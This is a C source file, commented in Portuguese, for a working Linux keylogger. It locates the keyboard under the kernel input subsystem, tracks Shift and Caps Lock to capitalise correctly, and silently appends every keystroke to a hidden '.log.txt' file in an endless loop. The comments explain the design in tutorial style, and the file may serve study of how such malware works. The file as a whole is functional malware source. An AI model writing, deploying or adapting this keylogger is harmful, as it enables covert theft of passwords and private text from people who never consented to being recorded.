// Bibliotecas padrão do sistema
#include <stdio.h>			// Entrada e saída padrão (printf, etc.)
#include <fcntl.h>			// Operações de controle de arquivo (open, flags)
#include <unistd.h>			// Syscalls POSIX (read, write, close)	
#include <string.h>			// Manipulação de strings (strlen, strcpy)
#include <ctype.h>			// Funções para caracteres (tolower)
#include <stdbool.h>
#include "keymap.h"			// Mapeamento de códigos de tecla
#include <linux/input.h>	// Estruturas do subsistema de entrada do kernel
#include <sys/ioctl.h>		// Syscall ioctl para controle de dispositivos

/*
 * Macros para manipulação de bits em operações de bitmap
 * Usadas para verificar capacidades do dispositivo
 */
#define BITS_PER_LONG (8 * sizeof(long))  		// Bits em um long (64 em sistemas 64-bit)
#define NBITS(x) ((((x) - 1) / BITS_PER_LONG) + 1) 	// Número de longs necessários para x bits


/*
 * Verifica se um bit específico está setado em um array de longs
 * bit: posição do bit a verificar
 * array: array de longs onde verificar
 * Retorna 1 se o bit estiver setado, 0 caso contrário
 */
#define IS_BIT_SET(bit, array) ((array[(bit) / BITS_PER_LONG] >> ((bit) % BITS_PER_LONG)) & 1)

// Buffer global para armazenar o caminho do dispositivo encontrado
char device[64];

// Protótipo da função definida em scan_device.c
int scan_device(char *device_path, size_t size);

/*
 * Função: caps_status()
 * Objetivo: Consultar o estado atual do LED de Caps Lock no teclado
 * Retorno: 1 se Caps Lock estiver ativo, 0 se inativo, -1 em caso de erro
 * 
 * Esta consulta inicial é crucial para sincronizar o estado interno
 * do programa com o estado real do teclado antes de começar a capturar eventos
 */
int caps_status() {
	 // Encontra o dispositivo de teclado e obtém seu file descriptor
    int fd = scan_device(device, sizeof(device));
    if(fd < 0) return -1; // Se não encontrou teclado, retorna erro
	
    // Array para armazenar o estado dos LEDs
    // NBITS(LED_CNT) calcula quantos longs são necessários
    unsigned long led_bits[NBITS(LED_CNT)];
    

	/*
     * ioctl com EVIOCGLED: "Event InterfaCe Get LED state"
     * Lê o estado atual de todos os LEDs do dispositivo
     * sizeof(led_bits) informa o tamanho do buffer
     * Retorna < 0 em caso de erro
     */
    if (ioctl(fd, EVIOCGLED(sizeof(led_bits)), led_bits) < 0) {
        close(fd); // Importante fechar o file descriptor em caso de erro
        return -1;
    }

    // Verifica se o bit correspondente ao LED_CAPSL está setado
    int status = IS_BIT_SET(LED_CAPSL, led_bits);
    close(fd); // Sempre fecha o file descriptor após o uso
    
    return status;
}

// Variáveis globais de estado - mantidas durante toda a execução

bool caps_lock_on;			  // Estado atual do Caps Lock (true = ativo)
bool shift_pressed = false;	  // Estado atual da tecla Shift (true = pressionada)

/*
 * Função principal: main
 * Fluxo:
 * 1. Encontra o teclado
 * 2. Sincroniza estado do Caps Lock
 * 3. Abre arquivo de log
 * 4. Loop principal de captura de eventos
 * 5. Processa cada evento e escreve no log
 */
int main(int argc, char** argv) {   
    int fd = scan_device(device, sizeof(device));		    // Encontra o dispositivo de teclado
    if(fd < 0) {
        //printf("DEBUG.\n");
        return -1;
    }
    
	  /*
     * SINCRONIZAÇÃO INICIAL: Validação do Caps Lock ANTES do loop
     * 
     * Isso é necessário porque o programa pode iniciar com Caps Lock já ativo,
     * e precisamos saber o estado inicial para interpretar corretamente
     * as teclas pressionadas. Sem isso, o primeiro caractere poderia
     * ser registrado com capitalização incorreta.
     */
    int status = caps_status(); 
    if(status < 0) {
        close(fd);
        return -1;
    }
    caps_lock_on = (bool)status; // Converte int para bool

	/*
     * ABERTURA DO ARQUIVO DE LOG
     * 
     * Flags usadas:
     * O_WRONLY  - Abre apenas para escrita
     * O_APPEND  - Sempre escreve no final do arquivo (preserva histórico)
     * O_CREAT   - Cria o arquivo se não existir
     * 0644      - Permissões: owner rw, group r, others r
     * 
     * O nome .log.txt começa com ponto, tornando-o oculto no GNU/Linux
     */
    int log_fd = open(".log.txt", O_WRONLY | O_APPEND | O_CREAT, 0644); 
    if(log_fd < 0) {
        close(fd);
        return -1;
    }

    // Estrutura que receberá cada evento do teclado
    struct input_event ev;

	/*
     * LOOP PRINCIPAL DE CAPTURA
     * 
     * Executa indefinidamente até ser interrompido (Ctrl+C ou kill)
     * O read() é bloqueante - consome 0% de CPU enquanto espera
     * pela próxima tecla. Isso é eficiente e correto.
     */

    while(1) {
		/*
         * LEITURA BLOQUEANTE DE EVENTO
         * 
         * A syscall read() bloqueia a execução até que um evento
         * completo esteja disponível. Isso evita busy-waiting e
         * é a maneira correta de ler dispositivos de entrada.
         * 
         * O kernel entrega eventos completos de sizeof(ev) bytes.
         */
        ssize_t bytes = read(fd, &ev, sizeof(ev));

        // Verificação de segurança: descarta eventos incompletos
        if (bytes < (ssize_t)sizeof(ev)) continue;
        
		/*
         * ATUALIZAÇÃO DE CAPS LOCK POR EVENTO
         * 
         * Quando o usuário pressiona a tecla Caps Lock, o kernel envia
         * um evento EV_LED com code LED_CAPSL e value indicando o novo estado.
         * Isso permite manter sincronia sem precisar de polling (consultas repetidas).
         */
        if (ev.type == EV_LED && ev.code == LED_CAPSL) {
            caps_lock_on = (bool)ev.value; // value: 1=LED acendeu, 0=LED apagou
        }
            
		/*
        * RASTREAMENTO DA TECLA SHIFT
        * 
        * Monitora quando Shift é pressionada (value==1) ou solta (value==0)
        * Tanto o Shift esquerdo quanto o direito são monitorados.
        * Isso é necessário para determinar a capitalização correta.
        */        
        if(ev.value == 1) { // Tecla Pressionada
            if(ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) shift_pressed = true;
        }   
        if(ev.value == 0) { // Tecla Solta
            if(ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) shift_pressed = false;
        }       
        
		/*
         * LÓGICA DE CAPITALIZAÇÃO
         * 
         * Aplica XOR lógico entre shift_pressed e caps_lock_on:
         * - Caps OFF, Shift OFF: should_uppercase = false (minúsculas)
         * - Caps OFF, Shift ON:  should_uppercase = true  (maiúsculas)
         * - Caps ON,  Shift OFF: should_uppercase = true  (maiúsculas)
         * - Caps ON,  Shift ON:  should_uppercase = false (minúsculas)
         * 
         * Isso replica exatamente o comportamento do teclado real.
         */
        bool should_uppercase = (shift_pressed != caps_lock_on); 
  
		/*
         * PROCESSAMENTO DE TECLAS PRESSIONADAS
         * 
         * Só processa eventos do tipo EV_KEY (teclas)
         * e apenas quando pressionadas (value == 1)
         * Ignora eventos de liberação (value == 0) e repetição (value == 2)
         */
        if(ev.type == EV_KEY && ev.value == 1) {
            const char *key = key_code_names[ev.code];  // Obtém a string correspondente ao código da tecla
            if(!key) key = "?"; // Se código não mapeado, mostra "?"
            
			/*
            * Cria uma cópia modificável da string
			* strlen(key) + 1 para incluir o terminador nulo '\0'
            */
            char _key[strlen(key) + 1];
            strcpy(_key, key);

			/*
             * APLICA CAPITALIZAÇÃO
             * 
             * Se should_uppercase for false, converte a string para minúsculas
             * tolower() só afeta letras maiúsculas, ignorando outros caracteres
             * Isso inclui símbolos e marcadores especiais (que não são afetados)
             */
            if(!should_uppercase) {
                int i = 0;
                while(_key[i] != '\0') {
                    _key[i] = tolower(_key[i]);  // Converte cada caractere
                    i++;
                }
            }
            
			/*
             * ESCRITA NO ARQUIVO DE LOG
             * 
             * Usa write() diretamente - syscall de baixo nível, sem buffer
             * do espaço do usuário. Isso garante que os dados sejam gravados
             * imediatamente no disco, sem delay.
             * 
             * O cast (void) suprime warnings sobre retorno não utilizado
             */

            ssize_t bytes_log = write(log_fd, _key, strlen(_key));
            (void)bytes_log; 
        }
    }
	// Este código nunca é alcançado no loop infinito,
    // mas é boa prática ter a limpeza aqui para manutenção futura
    close(fd);
    close(log_fd);
    return 0;
}
